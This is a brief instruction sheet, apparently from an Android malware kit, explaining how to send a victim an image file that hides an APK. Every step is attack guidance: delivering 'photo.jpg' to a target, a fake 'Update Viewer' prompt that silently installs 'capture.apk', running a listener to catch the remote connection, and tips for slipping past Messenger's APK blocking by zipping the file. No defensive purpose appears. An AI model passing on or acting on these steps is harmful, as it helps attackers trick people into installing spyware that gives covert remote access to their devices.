APK IMAGE FINAL PACKAGE

1. Send the 'photo.jpg' file to the target (Telegram, SD card, etc).
2. When the target opens it, they will see a fake 'Update Viewer' request.
3. If accepted, the hidden app (capture.apk) installs silently.
4. Your listener (python listener.py) must be running to catch the connection.

NOTES:
- NEVER send directly over Messenger (it blocks APK files).
- Best method: compress photo.jpg inside a ZIP before sending if needed.

Good luck!
